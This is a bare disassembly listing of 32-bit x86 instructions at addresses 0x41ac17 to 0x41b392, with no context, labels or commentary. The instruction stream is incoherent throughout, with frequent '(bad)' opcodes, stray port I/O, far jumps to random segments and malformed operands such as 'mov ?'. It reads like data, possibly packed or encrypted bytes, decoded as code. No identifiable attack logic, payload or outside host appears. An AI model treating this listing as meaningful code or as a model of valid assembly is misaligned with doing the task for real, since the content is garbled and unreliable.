  41ac17:	(bad)  
  41ac18:	lahf   
  41ac19:	xchg   BYTE PTR [esi+0x3ec71943],cl
  41ac1f:	mov    edi,0x6ab7feab
  41ac24:	xor    eax,0xac49b76e
  41ac29:	adc    dh,BYTE PTR [eax]
  41ac2b:	dec    esi
  41ac2c:	repz sub BYTE PTR [edi+0x62],0xf7
  41ac31:	sub    BYTE PTR [ebx-0x70],0x6e
  41ac35:	icebp  
  41ac36:	jge    0x41ac3f
  41ac38:	mov    dl,0x50
  41ac3a:	shr    DWORD PTR [eax],cl
  41ac3c:	sub    eax,0x34cc65a3
  41ac41:	add    eax,0x62846db9
  41ac46:	xor    al,0x15
  41ac48:	sbb    esi,DWORD PTR [eax+0x51]
  41ac4b:	jmp    0x61dd:0xc360323c
  41ac52:	pop    esp
  41ac53:	ins    DWORD PTR es:[edi],dx
  41ac54:	ds mov dh,0x39
  41ac57:	mov    eax,0xe07e46d9
  41ac5c:	xor    eax,0x57d065c0
  41ac61:	js     0x41acab
  41ac63:	call   0xa128:0x48bbd1b1
  41ac6a:	rol    edx,0x8d
  41ac6d:	push   eax
  41ac6e:	cmp    al,0x9c
  41ac70:	cmp    BYTE PTR [ebx+ebx*2+0x60f3330d],bl
  41ac77:	push   eax
  41ac78:	mov    cl,0x40
  41ac7a:	enter  0x183e,0x20
  41ac7e:	push   ds
  41ac7f:	add    BYTE PTR ds:0xc874a46c,al
  41ac85:	xchg   esp,eax
  41ac86:	sub    ebx,esp
  41ac88:	mov    cl,BYTE PTR [edx-0x22]
  41ac8b:	fdiv   st(6),st
  41ac8d:	push   0x46
  41ac8f:	dec    ebp
  41ac90:	test   al,0xca
  41ac92:	pop    edx
  41ac93:	shl    BYTE PTR [ecx+ecx*1+0x3f1f275b],1
  41ac9a:	pop    esp
  41ac9b:	in     al,dx
  41ac9c:	or     ebp,edx
  41ac9e:	xchg   dl,al
  41aca0:	(bad)  
  41aca1:	xchg   esi,eax
  41aca2:	(bad)  [eax]
  41aca4:	mov    eax,0x95cc1979
  41aca9:	and    DWORD PTR [ecx-0x5],esp
  41acac:	retf   0xe77b
  41acaf:	std    
  41acb0:	or     al,0x32
  41acb2:	rcl    DWORD PTR [esi],0x37
  41acb5:	fiadd  WORD PTR [edx-0x78]
  41acb8:	lds    esp,FWORD PTR [ebp+0x1cd90607]
  41acbe:	or     esi,DWORD PTR [eax+0x6e0d658d]
  41acc4:	add    al,0xd7
  41acc6:	push   di
  41acc8:	add    ecx,edx
  41acca:	xchg   ecx,eax
  41accb:	retf   0xdd5f
  41acce:	dec    esi
  41accf:	xor    ebx,DWORD PTR [ebx-0x5cee73f2]
  41acd5:	bound  ecx,QWORD PTR ds:0xc4882659
  41acdb:	cwde   
  41acdc:	sbb    ch,BYTE PTR [ecx+0x3f33b43]
  41ace2:	xchg   BYTE PTR [edi+ebp*8-0x55],al
  41ace6:	lahf   
  41ace7:	add    DWORD PTR [esi],ecx
  41ace9:	jl     0x41ad1c
  41aceb:	test   eax,0x526dd433
  41acf0:	popa   
  41acf1:	mov    ebp,0x416617e4
  41acf6:	in     al,dx
  41acf7:	pop    es
  41acf8:	push   es
  41acf9:	lods   eax,DWORD PTR ds:[esi]
  41acfa:	jns    0x41ac98
  41acfc:	or     al,bl
  41acfe:	(bad)  
  41acff:	out    dx,al
  41ad00:	adc    cl,bl
  41ad02:	les    ebp,FWORD PTR [eax+edx*1+0x3f9c614e]
  41ad09:	xor    ebx,DWORD PTR [esi-0x7d5f1ee5]
  41ad0f:	mov    ah,0x29
  41ad11:	mov    DWORD PTR [edx+0x56],esi
  41ad14:	and    cl,BYTE PTR [ebp+0x2f]
  41ad17:	dec    edi
  41ad18:	stc    
  41ad19:	in     eax,dx
  41ad1a:	sbb    DWORD PTR [ecx],eax
  41ad1c:	push   0x88f9022f
  41ad21:	aaa    
  41ad22:	(bad)  
  41ad23:	mov    ah,BYTE PTR [edx+esi*2]
  41ad26:	cmp    al,0xe3
  41ad28:	sar    BYTE PTR [ebx],cl
  41ad2a:	cs add al,0x6b
  41ad2d:	ret    0xb3c4
  41ad30:	aas    
  41ad31:	sub    DWORD PTR [eax+0xa],0x35
  41ad35:	sub    eax,0x7386b6ee
  41ad3a:	popa   
  41ad3b:	imul   edi,DWORD PTR [esi],0xffffffc6
  41ad3e:	xchg   edi,eax
  41ad3f:	mov    eax,0xbf2376c2
  41ad44:	rcl    DWORD PTR [ebp-0x57],cl
  41ad47:	retw   0xf161
  41ad4b:	out    0xc6,eax
  41ad4d:	imul   edi,DWORD PTR [eax-0x6d],0x57
  41ad51:	in     eax,dx
  41ad52:	loopne 0x41adba
  41ad54:	shl    DWORD PTR [ebx],1
  41ad56:	mov    ecx,0x10d80a8
  41ad5b:	xor    edx,DWORD PTR [ebx-0x1feee60e]
  41ad61:	lock sub al,0x83
  41ad64:	mov    dh,0x3
  41ad66:	jle    0x41adcf
  41ad68:	cmp    BYTE PTR [edx-0x5e835f26],ah
  41ad6e:	addr16 nop
  41ad70:	xchg   edx,eax
  41ad71:	in     eax,dx
  41ad72:	int3   
  41ad73:	pushf  
  41ad74:	pop    esi
  41ad75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad76:	push   ecx
  41ad77:	and    eax,DWORD PTR [edx]
  41ad79:	sub    eax,0x1677a72
  41ad7e:	inc    esi
  41ad7f:	add    al,0x7c
  41ad81:	pop    esi
  41ad82:	inc    eax
  41ad83:	sub    DWORD PTR [esp+ebx*1+0x51ea64f6],edi
  41ad8a:	push   ebp
  41ad8b:	mov    ah,0x69
  41ad8d:	mov    cl,0x2
  41ad8f:	es (bad) 
  41ad91:	in     al,dx
  41ad92:	add    al,0x91
  41ad94:	(bad)  
  41ad95:	mov    bl,0x8b
  41ad97:	loopne 0x41ad27
  41ad99:	data16 (bad) 
  41ad9b:	into   
  41ad9c:	popf   
  41ad9d:	scas   eax,DWORD PTR es:[edi]
  41ad9e:	xchg   DWORD PTR [ebx-0x6fd8104d],ebp
  41ada4:	push   esp
  41ada5:	enter  0x35a5,0xd9
  41ada9:	jno    0x41add5
  41adab:	pop    eax
  41adac:	jmp    0x54f6:0xea949479
  41adb3:	cmp    esp,DWORD PTR [ebx+edi*8]
  41adb6:	sti    
  41adb7:	sbb    edx,edi
  41adb9:	jno    0x41ada4
  41adbb:	jmp    0x41ae1d
  41adbd:	in     al,0x94
  41adbf:	call   0x4d82:0xb8799391
  41adc6:	jbe    0x41addb
  41adc8:	jmp    0xde01:0xf4b6cb3e
  41adcf:	sub    BYTE PTR [edi-0x5cf11d65],0xa3
  41add6:	ins    DWORD PTR es:[edi],dx
  41add7:	test   BYTE PTR [eax+0x2adbee5b],cl
  41addd:	xchg   esp,eax
  41adde:	je     0x41ad95
  41ade0:	sbb    esp,DWORD PTR [ecx-0x6c19664e]
  41ade6:	dec    edi
  41ade7:	sti    
  41ade8:	ss add ch,ah
  41adeb:	inc    ecx
  41adec:	jl     0x41ad8e
  41adee:	dec    esp
  41adef:	sar    ah,1
  41adf1:	or     eax,DWORD PTR [ebx+0xe23c06d]
  41adf7:	xor    BYTE PTR [edx+0x19750176],dl
  41adfd:	es push eax
  41adff:	mov    al,ds:0x8dd83e6c
  41ae04:	sub    ah,BYTE PTR [ecx+0x1a]
  41ae07:	pop    ss
  41ae08:	mov    bh,0xd
  41ae0a:	add    cl,ah
  41ae0c:	mov    ebx,0xf8bbb34d
  41ae11:	aaa    
  41ae12:	jmp    0x1bdc:0x2a852376
  41ae19:	and    ebx,0xc2fb5a02
  41ae1f:	cwde   
  41ae20:	imul   edi,DWORD PTR [esi+0x305b0525],0x17
  41ae27:	mov    dl,0x51
  41ae29:	dec    edx
  41ae2a:	jo     0x41ae05
  41ae2c:	mov    edi,0xafb0188c
  41ae31:	ficom  DWORD PTR [esi-0x39]
  41ae34:	lea    ebp,[eax+eax*1-0xa]
  41ae38:	test   ebx,esi
  41ae3a:	jp     0x41aeba
  41ae3c:	xor    edx,DWORD PTR [esi+0x64a37afc]
  41ae42:	lock int3 
  41ae44:	or     eax,edi
  41ae46:	stc    
  41ae47:	ja     0x41adda
  41ae49:	mov    eax,0x98989312
  41ae4e:	inc    edi
  41ae4f:	push   ds
  41ae50:	js     0x41ae4f
  41ae52:	push   es
  41ae53:	adc    DWORD PTR [eax+0x1190784f],esi
  41ae59:	xchg   esi,eax
  41ae5a:	inc    esi
  41ae5b:	xchg   ebx,edx
  41ae5d:	ror    BYTE PTR [esi],0x16
  41ae60:	dec    ebx
  41ae61:	rcr    BYTE PTR [eax-0x54],cl
  41ae64:	push   ss
  41ae65:	push   ds
  41ae66:	pop    esp
  41ae67:	or     bh,BYTE PTR [eax]
  41ae69:	cmp    eax,0x55c04aee
  41ae6e:	fldcw  WORD PTR [edx]
  41ae70:	xchg   edx,eax
  41ae71:	fst    QWORD PTR [ebx+0xb]
  41ae74:	icebp  
  41ae75:	and    ch,ah
  41ae77:	or     eax,0xc2a21433
  41ae7c:	dec    edx
  41ae7d:	add    dl,BYTE PTR [edi-0x1a]
  41ae80:	fistp  DWORD PTR ds:0x67137cb8
  41ae86:	mov    ss,WORD PTR [ebx]
  41ae88:	cli    
  41ae89:	iret   
  41ae8a:	xchg   dh,al
  41ae8c:	fnstsw WORD PTR ds:0x4a753b3d
  41ae92:	into   
  41ae93:	icebp  
  41ae94:	iret   
  41ae95:	pop    ds
  41ae96:	cmp    DWORD PTR [ebx],esp
  41ae98:	jmp    0xf086:0x2e81092
  41ae9f:	add    eax,0x4928b0d4
  41aea4:	xor    DWORD PTR [eax+0x49c52c2b],ecx
  41aeaa:	jbe    0x41af02
  41aeac:	bound  eax,QWORD PTR [ebx+esi*2+0xbdebf86]
  41aeb3:	shr    dl,0xd1
  41aeb6:	stos   DWORD PTR es:[edi],eax
  41aeb7:	loopne 0x41aec9
  41aeb9:	jo     0x41af39
  41aebb:	out    dx,al
  41aebc:	xchg   ebp,eax
  41aebd:	aas    
  41aebe:	lds    edx,FWORD PTR [edi+0x4a]
  41aec1:	dec    ebp
  41aec2:	ins    BYTE PTR es:[edi],dx
  41aec3:	call   0x5c53e23a
  41aec8:	inc    eax
  41aec9:	mov    ?,WORD PTR [edx+ecx*1+0x6d]
  41aecd:	scas   eax,DWORD PTR es:[edi]
  41aece:	lds    ecx,FWORD PTR [eax+ecx*8]
  41aed1:	add    al,0x7a
  41aed3:	scas   eax,DWORD PTR es:[edi]
  41aed4:	pusha  
  41aed5:	in     al,dx
  41aed6:	(bad)  
  41aed7:	pop    edi
  41aed8:	sbb    bl,BYTE PTR [ebx+0xdd64b71]
  41aede:	mov    esi,0xb7fcd4ea
  41aee3:	cwde   
  41aee4:	or     eax,eax
  41aee6:	sahf   
  41aee7:	xchg   BYTE PTR [ecx+eax*8+0x56f4e6cd],dl
  41aeee:	retf   
  41aeef:	jne    0x41af00
  41aef1:	mov    edx,DWORD PTR [edi]
  41aef3:	jl     0x41af70
  41aef5:	repnz pop eax
  41aef7:	mov    bh,0x6
  41aef9:	mov    eax,ds:0xb2179ac7
  41aefe:	aad    0xe3
  41af00:	pop    ebx
  41af01:	push   ss
  41af02:	enter  0xa026,0x8b
  41af06:	loop   0x41af33
  41af08:	daa    
  41af09:	stos   BYTE PTR es:[edi],al
  41af0a:	icebp  
  41af0b:	shr    BYTE PTR [ebx-0x783a029e],0x19
  41af12:	lods   eax,DWORD PTR ds:[esi]
  41af13:	test   eax,0xf45bcddd
  41af18:	add    BYTE PTR [ecx],bh
  41af1a:	js     0x41aeda
  41af1c:	push   edi
  41af1d:	inc    esi
  41af1e:	mov    WORD PTR [esi-0x1922c16c],ss
  41af24:	lea    ebx,[ecx-0x2ab00c2c]
  41af2a:	dec    eax
  41af2b:	add    al,BYTE PTR [edx-0x46]
  41af2e:	repnz adc eax,0xd985dfbf
  41af34:	add    eax,0xc15cdec7
  41af39:	scas   eax,DWORD PTR es:[edi]
  41af3a:	add    BYTE PTR ds:0xe7e98395,ch
  41af40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af41:	sti    
  41af42:	adc    BYTE PTR [eax+0x6f],ah
  41af45:	push   ss
  41af46:	or     dh,BYTE PTR [eax-0x67]
  41af49:	ss cmp dl,al
  41af4c:	retf   0x628e
  41af4f:	stc    
  41af50:	xlat   BYTE PTR ds:[ebx]
  41af51:	xlat   BYTE PTR ds:[ebx]
  41af52:	cmp    DWORD PTR [esi-0x18d0f294],esp
  41af58:	sub    edx,esp
  41af5a:	xor    al,0xff
  41af5c:	sub    bl,BYTE PTR ss:[ecx+0x1f]
  41af60:	std    
  41af61:	ins    BYTE PTR es:[edi],dx
  41af62:	pop    esp
  41af63:	jbe    0x41af84
  41af65:	xchg   ebx,eax
  41af66:	jmp    0xc00e:0x634c3d1d
  41af6d:	mov    al,0x85
  41af6f:	stos   DWORD PTR es:[edi],eax
  41af70:	and    al,al
  41af72:	and    DWORD PTR [edi+0x33242ca5],edx
  41af78:	inc    esp
  41af79:	leave  
  41af7a:	xor    eax,0x4f0a5172
  41af7f:	ds add dh,ah
  41af82:	xor    al,cl
  41af84:	sub    eax,0x577660ea
  41af89:	imul   esp,eax,0xffffffbf
  41af8c:	popa   
  41af8d:	mov    dh,0x4
  41af8f:	dec    ebp
  41af90:	pcmpgtd mm4,QWORD PTR [edi-0x6c]
  41af94:	int3   
  41af95:	ret    
  41af96:	int    0x24
  41af98:	pushf  
  41af99:	repnz adc BYTE PTR [ebx],ch
  41af9c:	leave  
  41af9d:	mov    esp,DWORD PTR [esi+ecx*4+0x5c]
  41afa1:	stos   DWORD PTR es:[edi],eax
  41afa2:	inc    edi
  41afa3:	push   ebp
  41afa4:	push   eax
  41afa5:	add    al,0xf6
  41afa7:	mov    ?,WORD PTR [ebx-0x70]
  41afaa:	std    
  41afab:	mov    edi,0xd55b27c6
  41afb0:	std    
  41afb1:	xor    al,0xfd
  41afb3:	xor    DWORD PTR [edi+edi*8-0x54],esp
  41afb7:	sub    DWORD PTR [ebp+0x53f9cfb8],ecx
  41afbd:	mov    DWORD PTR cs:[ebx],ecx
  41afc0:	dec    ecx
  41afc1:	mov    eax,ds:0x5eac4a1b
  41afc6:	in     eax,0x7e
  41afc8:	dec    esi
  41afc9:	mov    edi,edi
  41afcb:	stos   DWORD PTR es:[edi],eax
  41afcc:	ins    DWORD PTR es:[edi],dx
  41afcd:	cld    
  41afce:	fcom   DWORD PTR [ebx+eiz*8]
  41afd1:	and    esp,DWORD PTR [ecx+0x81389c3]
  41afd7:	or     eax,0xd9be708e
  41afdc:	mov    BYTE PTR [ebx+0x3da49814],cl
  41afe2:	pop    es
  41afe3:	(bad)  [edx]
  41afe5:	mov    WORD PTR [edx+0x4a],ss
  41afe8:	retf   0xc663
  41afeb:	fbld   TBYTE PTR [eax]
  41afed:	inc    esp
  41afee:	aad    0xa0
  41aff0:	mov    esi,0x5cc161e4
  41aff5:	sub    eax,0xf1d99efa
  41affa:	sub    edx,DWORD PTR [eax+0x47]
  41affd:	xor    al,0x5e
  41afff:	loopne 0x41afc8
  41b001:	pop    eax
  41b002:	sub    ebx,DWORD PTR [edx+edx*1+0x34]
  41b006:	dec    edi
  41b007:	sbb    DWORD PTR [esi],edi
  41b009:	and    ch,dl
  41b00b:	dec    ecx
  41b00c:	outs   dx,DWORD PTR ds:[esi]
  41b00d:	aam    0xca
  41b00f:	popa   
  41b010:	dec    ebx
  41b011:	push   ss
  41b012:	xchg   ebx,eax
  41b013:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b014:	leave  
  41b015:	pop    eax
  41b016:	xor    ch,BYTE PTR [ebp-0x6a69b0d2]
  41b01c:	ins    BYTE PTR es:[edi],dx
  41b01d:	dec    esp
  41b01e:	push   ebp
  41b01f:	jae    0x41afc4
  41b021:	repz fsub QWORD PTR [ebx]
  41b024:	into   
  41b025:	out    dx,eax
  41b026:	and    esi,DWORD PTR [eax-0x44]
  41b029:	(bad)  
  41b02a:	pushf  
  41b02b:	in     eax,dx
  41b02c:	mov    ds:0xfad18284,al
  41b031:	push   ebx
  41b032:	fs dec edi
  41b034:	push   edx
  41b035:	pusha  
  41b036:	mov    esp,0x4de46e6e
  41b03b:	in     al,dx
  41b03c:	idiv   DWORD PTR [edx]
  41b03e:	jge    0x41b011
  41b040:	repnz shr BYTE PTR [ecx],cl
  41b043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b044:	call   0x8eec23c9
  41b049:	push   esi
  41b04a:	xchg   BYTE PTR [edx+0x3e84a776],dh
  41b050:	jae    0x41b0bc
  41b052:	push   esp
  41b053:	cli    
  41b054:	pop    ecx
  41b055:	cmc    
  41b056:	push   ecx
  41b057:	outs   dx,DWORD PTR ds:[esi]
  41b058:	stos   BYTE PTR es:[edi],al
  41b059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b05a:	xor    eax,0x71387aa7
  41b05f:	test   eax,0xcdf56dc4
  41b064:	push   ds
  41b065:	je     0x41b0a3
  41b067:	jns    0x41b05e
  41b069:	sub    ah,dl
  41b06b:	mov    eax,0x46ce9721
  41b070:	aam    0xc3
  41b072:	adc    DWORD PTR [esi],0xfc61f514
  41b078:	mov    ebp,0xc77ca100
  41b07d:	pop    eax
  41b07e:	stos   DWORD PTR es:[edi],eax
  41b07f:	inc    edi
  41b080:	(bad)  
  41b081:	nop
  41b082:	aam    0x8b
  41b084:	scas   al,BYTE PTR es:[edi]
  41b085:	ror    bh,0xd8
  41b088:	test   eax,0xbf47ce0e
  41b08d:	dec    ebp
  41b08e:	lahf   
  41b08f:	ret    
  41b090:	call   DWORD PTR [esi]
  41b092:	mov    dl,BYTE PTR [eax-0x55a86579]
  41b098:	lods   eax,DWORD PTR ds:[esi]
  41b099:	pcmpeqd mm3,mm2
  41b09c:	pop    esi
  41b09d:	push   cs
  41b09e:	push   ecx
  41b09f:	or     al,0xe5
  41b0a1:	mov    WORD PTR [edx+0x0],ss
  41b0a4:	ss fs je 0x41b06b
  41b0a8:	push   es
  41b0a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0aa:	data16 jae 0x41b058
  41b0ad:	mov    al,ds:0x13e46f36
  41b0b2:	and    BYTE PTR [edx],0x76
  41b0b5:	inc    esp
  41b0b6:	fs iret 
  41b0b8:	inc    esp
  41b0b9:	outs   dx,BYTE PTR ds:[esi]
  41b0ba:	ja     0x41b083
  41b0bc:	fimul  DWORD PTR [ebx*4-0x7b0dc81d]
  41b0c3:	leave  
  41b0c4:	mov    al,ds:0x3065b24e
  41b0c9:	add    DWORD PTR [esi+eiz*8-0x2bfc82cc],eax
  41b0d0:	xchg   edi,eax
  41b0d1:	dec    esi
  41b0d2:	mov    bh,0xa4
  41b0d4:	mov    esi,0xfdc762a3
  41b0d9:	xor    edx,DWORD PTR [eax-0x7174a213]
  41b0df:	adc    DWORD PTR [edx],eax
  41b0e1:	sbb    eax,0x771b3ae4
  41b0e6:	pop    eax
  41b0e7:	dec    ebx
  41b0e8:	fidivr DWORD PTR [edi]
  41b0ea:	in     al,dx
  41b0eb:	leave  
  41b0ec:	(bad)  
  41b0ed:	js     0x41b081
  41b0ef:	fwait
  41b0f0:	jl     0x41b10e
  41b0f2:	ja     0x41b0f0
  41b0f4:	into   
  41b0f5:	cmp    eax,0xd40187c0
  41b0fa:	adc    DWORD PTR ds:0xe7857fb9,ecx
  41b100:	and    al,BYTE PTR [ebx-0x7d]
  41b103:	pop    es
  41b104:	xchg   edx,eax
  41b105:	jecxz  0x41b178
  41b107:	or     cl,BYTE PTR [ebx+0x29917bf9]
  41b10d:	jge    0x41b0a6
  41b10f:	sub    eax,0x9b1ede68
  41b114:	mov    cl,0x27
  41b116:	cmp    BYTE PTR ds:[edx-0x6],bl
  41b11a:	pusha  
  41b11b:	int    0x79
  41b11d:	pop    es
  41b11e:	mov    fs,WORD PTR [ecx-0x823a925]
  41b124:	(bad)  
  41b125:	je     0x41b0b1
  41b127:	addr16 addr16 or eax,0x84a14586
  41b12e:	jo     0x41b1a5
  41b130:	push   eax
  41b131:	mov    esp,0x3dac63d0
  41b136:	and    edx,DWORD PTR [ebx+0x33]
  41b139:	jno    0x41b0f3
  41b13b:	dec    edi
  41b13c:	add    BYTE PTR [esi-0x7a],bl
  41b13f:	inc    edi
  41b140:	add    DWORD PTR [edx-0x72],ebp
  41b143:	dec    edx
  41b144:	sbb    ebx,DWORD PTR [edx]
  41b146:	int3   
  41b147:	mov    dh,0xa3
  41b149:	pusha  
  41b14a:	mov    edx,0x473b6fcd
  41b14f:	jge    0x41b0f8
  41b151:	xor    ebp,DWORD PTR [ebp+0x10e047aa]
  41b157:	dec    edi
  41b158:	jmp    0x3cc5:0x4fc63f02
  41b15f:	jmp    0x41b10c
  41b161:	ret    0xae2a
  41b164:	xchg   edx,eax
  41b165:	out    dx,eax
  41b166:	lds    edx,FWORD PTR [ebp+0x40a7f593]
  41b16c:	fcomp  DWORD PTR [edi+0x2b]
  41b16f:	fsubr  DWORD PTR [ecx]
  41b171:	inc    ebx
  41b172:	pop    ecx
  41b173:	mov    al,0xdf
  41b175:	push   ecx
  41b176:	out    dx,eax
  41b177:	or     DWORD PTR [ecx],ebx
  41b179:	cmp    edx,DWORD PTR [di-0x7c]
  41b17d:	pop    ebx
  41b17e:	or     eax,0x79105388
  41b183:	cld    
  41b184:	mov    eax,ds:0xa281d3f9
  41b189:	or     eax,0xffb72163
  41b18e:	or     BYTE PTR [edi-0x26],bh
  41b191:	lds    ecx,FWORD PTR [eax+0x56]
  41b194:	lods   al,BYTE PTR ds:[esi]
  41b195:	cli    
  41b196:	out    dx,al
  41b197:	lods   eax,DWORD PTR ds:[esi]
  41b198:	jge    0x41b157
  41b19a:	imul   edi,edx,0x4b53c0b
  41b1a0:	fwait
  41b1a1:	icebp  
  41b1a2:	ds aas 
  41b1a4:	dec    edi
  41b1a5:	push   ds
  41b1a6:	pop    ecx
  41b1a7:	cmp    eax,0xd915af43
  41b1ac:	push   cs
  41b1ad:	jp     0x41b18a
  41b1af:	adc    al,BYTE PTR [ecx]
  41b1b1:	push   ecx
  41b1b2:	pop    esi
  41b1b3:	cmp    cl,ch
  41b1b5:	hlt    
  41b1b6:	sub    BYTE PTR [esi+0x23f65d33],bh
  41b1bc:	jecxz  0x41b20c
  41b1be:	sub    eax,0x4e871b67
  41b1c3:	mov    esp,0x1a11feac
  41b1c8:	rcl    DWORD PTR [edi],1
  41b1ca:	into   
  41b1cb:	and    BYTE PTR [ebp+0x101691dd],bl
  41b1d1:	sub    ebp,DWORD PTR [ebx+0x6e]
  41b1d4:	addr16 xor al,0xda
  41b1d7:	and    eax,0xe771a80e
  41b1dc:	sub    BYTE PTR [eax-0x2393fd],al
  41b1e2:	sahf   
  41b1e3:	fs cwde 
  41b1e5:	clc    
  41b1e6:	fmul   st(3),st
  41b1e8:	cmp    BYTE PTR [ebx],al
  41b1ea:	aam    0x6
  41b1ec:	cwde   
  41b1ed:	pop    ebx
  41b1ee:	inc    edx
  41b1ef:	xchg   DWORD PTR [edx],esi
  41b1f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1f2:	ret    
  41b1f3:	(bad)  
  41b1f4:	inc    edi
  41b1f5:	jmp    FWORD PTR [edi+0x66b5e3d8]
  41b1fb:	sub    al,0x51
  41b1fd:	rol    BYTE PTR [ecx+0x3263e5c6],1
  41b203:	aaa    
  41b204:	mov    ch,0x11
  41b206:	xor    al,0x9b
  41b208:	hlt    
  41b209:	or     ebx,DWORD PTR [ebp-0x41]
  41b20c:	sbb    ch,0x42
  41b20f:	and    BYTE PTR ds:0x8668fddd,0xc8
  41b216:	ja     0x41b205
  41b218:	add    bh,BYTE PTR [eax+0x730d0b1a]
  41b21e:	in     al,0xd0
  41b220:	jl     0x41b25f
  41b222:	test   esi,ebx
  41b224:	(bad)  
  41b225:	jae    0x41b22b
  41b227:	cwde   
  41b228:	popf   
  41b229:	lock cmp cl,BYTE PTR [ebx-0x5e]
  41b22d:	pop    ebx
  41b22e:	sbb    ch,BYTE PTR [ecx]
  41b230:	dec    eax
  41b231:	daa    
  41b232:	in     al,dx
  41b233:	jecxz  0x41b2ad
  41b235:	icebp  
  41b236:	(bad)  
  41b237:	jns    0x41b1f6
  41b239:	aam    0x27
  41b23b:	scas   al,BYTE PTR es:[edi]
  41b23c:	fs xadd ecx,esi
  41b240:	pop    eax
  41b241:	arpl   WORD PTR [ecx-0x30],dx
  41b244:	push   edx
  41b245:	std    
  41b246:	jp     0x41b23c
  41b248:	pop    edi
  41b249:	fs cmp ebp,esp
  41b24c:	xchg   edi,eax
  41b24d:	push   es
  41b24e:	mov    edi,0x2a40f003
  41b253:	inc    ebx
  41b254:	std    
  41b255:	ins    DWORD PTR es:[edi],dx
  41b256:	hlt    
  41b257:	sub    ecx,0xfb31e541
  41b25d:	outs   dx,DWORD PTR ds:[esi]
  41b25e:	stos   BYTE PTR es:[edi],al
  41b25f:	fcom   QWORD PTR [ebp+0x71291a32]
  41b265:	push   0x76bcab3c
  41b26a:	mov    ds:0x3aa28acf,al
  41b26f:	retf   
  41b270:	ja     0x41b2c0
  41b272:	sbb    dl,bl
  41b274:	aam    0x91
  41b276:	pop    edx
  41b277:	aaa    
  41b278:	or     al,0x88
  41b27a:	cld    
  41b27b:	sub    dh,BYTE PTR [edx+0x1731ff61]
  41b281:	pop    esp
  41b282:	dec    esp
  41b283:	adc    eax,0xdd4ea623
  41b288:	mov    al,0xe
  41b28a:	and    DWORD PTR [ebp+esi*1-0x18],ebp
  41b28e:	sub    DWORD PTR [ebx+0x9],0xffffffe7
  41b292:	ds push edi
  41b294:	lods   eax,DWORD PTR ds:[esi]
  41b295:	ret    0x6de2
  41b298:	add    edi,edi
  41b29a:	mov    al,BYTE PTR [eax+0x1c999517]
  41b2a0:	and    edx,DWORD PTR [eax+0x34]
  41b2a3:	jecxz  0x41b2f8
  41b2a5:	jge    0x41b2f9
  41b2a7:	sbb    eax,0x872b0d61
  41b2ac:	xchg   ebp,eax
  41b2ad:	inc    esp
  41b2ae:	lds    edi,FWORD PTR [esi-0x3cc62bb7]
  41b2b4:	and    BYTE PTR [edx],cl
  41b2b6:	es pop eax
  41b2b8:	psubusb mm2,QWORD PTR [ecx]
  41b2bb:	data16 mov ch,0x9e
  41b2be:	adc    DWORD PTR [ebp-0x48],ecx
  41b2c1:	cmc    
  41b2c2:	std    
  41b2c3:	popf   
  41b2c4:	pop    ss
  41b2c5:	xor    edx,DWORD PTR [eax+ebp*2]
  41b2c8:	and    esi,DWORD PTR [edi-0x30]
  41b2cb:	dec    edi
  41b2cc:	int    0x41
  41b2ce:	iret   
  41b2cf:	popa   
  41b2d0:	sbb    esi,DWORD PTR [ebp-0x4e]
  41b2d3:	mov    ds:0x36dad539,al
  41b2d8:	jg     0x41b2cc
  41b2da:	add    al,0x84
  41b2dc:	mov    dh,0xcc
  41b2de:	cli    
  41b2df:	or     esi,DWORD PTR [esi-0x25a8bd46]
  41b2e5:	jge    0x41b2c1
  41b2e7:	fs jmp 0xe5ae937
  41b2ed:	push   esi
  41b2ee:	mov    esp,0x6d615f97
  41b2f3:	gs push esi
  41b2f5:	add    bl,BYTE PTR [eax+0x62]
  41b2f8:	cmp    DWORD PTR [ecx+edi*4+0x73],edi
  41b2fc:	add    dl,BYTE PTR [ebp-0xa]
  41b2ff:	inc    eax
  41b300:	addr16 in eax,0xa5
  41b303:	cdq    
  41b304:	ins    BYTE PTR es:[edi],dx
  41b305:	rcr    dl,0x9d
  41b308:	(bad)  
  41b309:	aaa    
  41b30a:	mov    DWORD PTR [eax],0xcda1275a
  41b310:	cmp    ah,0xa9
  41b313:	pop    ecx
  41b314:	out    0xb1,al
  41b316:	push   ebx
  41b317:	mov    BYTE PTR [ecx],ch
  41b319:	out    0xca,al
  41b31b:	sbb    ebx,DWORD PTR [edx-0x5fc4fcb3]
  41b321:	xchg   ecx,eax
  41b322:	lock mov eax,ds:0x6fa21442
  41b328:	cmp    al,BYTE PTR [esi]
  41b32a:	cmp    al,0x85
  41b32c:	jae    0x41b30d
  41b32e:	mov    BYTE PTR [edi+edi*1+0x63],cl
  41b332:	outs   dx,BYTE PTR cs:[esi]
  41b334:	mov    WORD PTR [ebx],ds
  41b336:	inc    esp
  41b337:	sub    DWORD PTR [edi],ebp
  41b339:	int    0xf2
  41b33b:	inc    ebp
  41b33c:	jbe    0x41b359
  41b33e:	retf   0x5697
  41b341:	sar    DWORD PTR [ecx],0x95
  41b344:	test   DWORD PTR [ecx],ecx
  41b346:	mov    esi,DWORD PTR [ecx+esi*8-0x3ea44e19]
  41b34d:	push   esi
  41b34e:	dec    ebx
  41b34f:	repnz push eax
  41b351:	and    al,0x7f
  41b353:	bound  esp,QWORD PTR [ecx+0x12]
  41b356:	or     DWORD PTR [eax-0x29f5e31b],ebp
  41b35c:	add    DWORD PTR [edi-0x3c],edx
  41b35f:	into   
  41b360:	fdivr  st(0),st
  41b362:	inc    dx
  41b364:	pop    ds
  41b365:	jmp    FWORD PTR [esi]
  41b367:	jge    0x41b3dc
  41b369:	inc    edi
  41b36a:	jmp    0xd1df1eff
  41b36f:	or     eax,0x9fed11d4
  41b374:	mov    ch,0xae
  41b376:	pusha  
  41b377:	(bad)  
  41b378:	xchg   ecx,eax
  41b379:	scas   eax,DWORD PTR es:[edi]
  41b37a:	push   ecx
  41b37b:	out    0xba,eax
  41b37d:	jg     0x41b30a
  41b37f:	mov    ebx,0x83bc1f0
  41b384:	jnp    0x41b3df
  41b386:	sbb    BYTE PTR [eax-0xf],ah
  41b389:	inc    edi
  41b38a:	or     esi,eax
  41b38c:	add    edx,DWORD PTR ds:0x1b5a32d6
  41b392:	mov    al,0xb8
